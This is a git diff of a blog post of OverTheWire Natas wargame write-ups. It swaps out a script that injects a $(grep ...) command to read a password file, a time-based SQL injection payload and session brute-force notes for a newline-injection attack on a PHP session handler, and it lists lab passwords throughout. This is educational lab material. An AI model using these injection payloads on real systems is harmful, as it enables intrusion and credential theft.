@@ -1,104 +1,89 @@
 ---
-title: Wargames - Natas 1
+title: Wargames - Natas 21
 published: false 
 tags: game natas
 ---
 
-# ## [Level 16 -> Level 17](https://overthewire.org/wargames/natas/natas17.html)
-
-Username: natas16
-Lab URL: http://natas16.natas.labs.overthewire.org/
-
-I have updated previwous script to get password from this level:
-
-```
-import requests
-import string 
-
-username = "natas16"
-passwd = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
-
-valid = "hacker"
-
-characters = list(string.digits) + list(string.ascii_letters)
-
-print('Characters: {}'.format(''.join(characters)))
-
-password = []
-
-for i in range(1, 34):
-    for ch in characters:
-        url = 'http://natas16.natas.labs.overthewire.org/?needle=$(grep -E ^{}.* /etc/natas_webpass/natas17)hacker'.format(''.join(password)+ch)
-        r = requests.get(url, auth=(username, passwd))
-                
-        if valid not in r.text:
-            password.append(ch)
-            continue
-
-print('Password: {}'.format(''.join(password)))
-```
-
-password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
-
-
-# ## [Level 17 -> Level 18](https://overthewire.org/wargames/natas/natas18.html)
-
-Username: natas17
-Lab URL: http://natas17.natas.labs.overthewire.org/
-
-payload: natas18" and if(substring(password,1,1)="x",sleep(5),'A')# -> if true then sleep for 5 seconds
-
-password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
-
-# ## [Level 18 -> Level 19](https://overthewire.org/wargames/natas/natas19.html)
-
-Username: natas18
-Lab URL: http://natas18.natas.labs.overthewire.org/
-
-Brute force admin session id, you can use burp for this or write python script:
-
-![Password](assets/natas/18/password.png)
-
-password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
-
-# ## [Level 19 -> Level 20](https://overthewire.org/wargames/natas/natas20.html)
-
-Username: natas19
-Lab URL: http://natas19.natas.labs.overthewire.org/
-
-Firsty I decode session id:
-
-![Session id](assets/natas/19/session_id_decode.png)
-
-So now session id is number with additioan passphrase, I has generate data to brute force it, use following script to get data:
-
-```
-for i in range(0, 2000):
-    payload = '{}-admin'.format(i)
-    print(payload.encode('utf-8').hex())
-```
-
-After all prepare attack in burp:
-
-![Password](assets/natas/19/password.png)
-
-password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
-
-# ## [Level 20 -> Level 21](https://overthewire.org/wargames/natas/natas21.html)
+## [Level 21](https://overthewire.org/wargames/natas/natas21.html)
 
 Username: natas20
+Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
 Lab URL: http://natas20.natas.labs.overthewire.org/
 
+Firstly we should be most interested in source code, lets get closer look. 
 
-password: 
+This part sets handers to manage session:
+```
+session_set_save_handler(
+    "myopen", // not interesting
+    "myclose", // not interesting
+    "myread", // interesing
+    "mywrite", // interesing
+    "mydestroy", // not interesting
+    "mygarbage" // not interesting
+    );
+```
 
-DEBUG: MYREAD esbfjdpik4e2rn1k351qad3tr7
-DEBUG: Reading from /var/lib/php5/sessions//mysess_esbfjdpik4e2rn1k351qad3tr7
-DEBUG: Read [name "admin]
-DEBUG: Read [admin 1"]
-DEBUG: Read []
-DEBUG: Name set to "admin admin 1"
-You are an admin. The credentials for the next level are:
+This function set custom handers to process session data. More about it is ![here](https://www.php.net/manual/en/function.session-set-save-handler.php).
 
-Username: natas21
-Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
+I remove all not interesting code from php code:
+```
+<?
+function myread($sid) { 
+    debug("MYREAD $sid"); 
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID"); 
+        return "";
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    if(!file_exists($filename)) {
+        debug("Session file doesn't exist");
+        return "";
+    }
+    debug("Reading from ". $filename);
+    $data = file_get_contents($filename);
+    $_SESSION = array();
+    foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+    $parts = explode(" ", $line, 2);
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+    }
+    return session_encode();
+}
+
+function mywrite($sid, $data) { 
+    // $data contains the serialized version of $_SESSION
+    // but our encoding is better
+    debug("MYWRITE $sid $data"); 
+    // make sure the sid is alnum only!!
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID"); 
+        return;
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    $data = "";
+    debug("Saving in ". $filename);
+    ksort($_SESSION);
+    foreach($_SESSION as $key => $value) {
+        debug("$key => $value");
+        $data .= "$key $value\n"; // This line is very interesting 
+    }
+    file_put_contents($filename, $data);
+    chmod($filename, 0600);
+}
+
+session_set_save_handler(
+    "myread", 
+    "mywrite", 
+);
+?> 
+```
+
+Ther is possibility to incject own code, by submitting:
+```
+http://natas20.natas.labs.overthewire.org/index.php?name=admin%0Aadmin%201
+```
+
+we receive password.
+
+password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
